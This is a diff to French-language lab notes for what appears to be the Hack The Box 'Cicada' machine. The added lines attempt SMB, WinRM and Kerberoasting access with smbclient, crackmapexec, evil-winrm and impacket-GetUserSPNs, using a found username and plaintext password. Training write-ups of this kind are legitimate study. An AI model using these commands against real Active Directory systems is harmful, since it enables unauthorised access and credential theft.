@@ -229,5 +229,20 @@ On a donc réussi a choper un login (emily.oscars)
 
 J'essaie de me co avec emily
 
-smbclient -U 'cicada.htb\emily.oscars%Cicada$M6Corpb*@Lp#nZp!8' //10.10.11.35/HR
+smbclient -U 'cicada.htb\emily.oscars%Cicada$M6Corpb*@Lp#nZp!8' //10.10.11.35/HR -> marche pas
 
+crackmapexec smb 10.10.11.35 -u emily.oscars -p 'Cicada$M6Corpb*@Lp#nZp!8' -> marche pas
+
+evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Cicada$M6Corpb*@Lp#nZp!8' -> marche pas
+
+crackmapexec smb 10.10.11.35 -u 'emily.oscars' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
+smbclient -U 'emily.oscars%Cicada$M6Corpb*@Lp#nZp!8' //10.10.11.35/HR
+smbclient -U 'emily.oscars%Cicada$M6Corpb*@Lp#nZp!8' //10.10.11.35/DEV
+smbclient -U 'emily.oscars%' //10.10.11.35/DEV 
+smbclient -U 'emily.oscars%' //10.10.11.35/HR
+smbclient -U 'emily.oscars%Cicada$M6Corpb*@Lp#nZp!8' //10.10.11.35/NETLOGON
+smbclient -U 'emily.oscars%Cicada$M6Corpb*@Lp#nZp!8' //10.10.11.35/SYSVOL
+
+On a donc un user mais le mot de passe qu'on avait trouvé avant ne fonctionne pas
+
+impacket-GetUserSPNs cicada.htb/emily.oscars:'Cicada$M6Corpb*@Lp#nZp!8' -dc-ip 10.10.11.35 -request
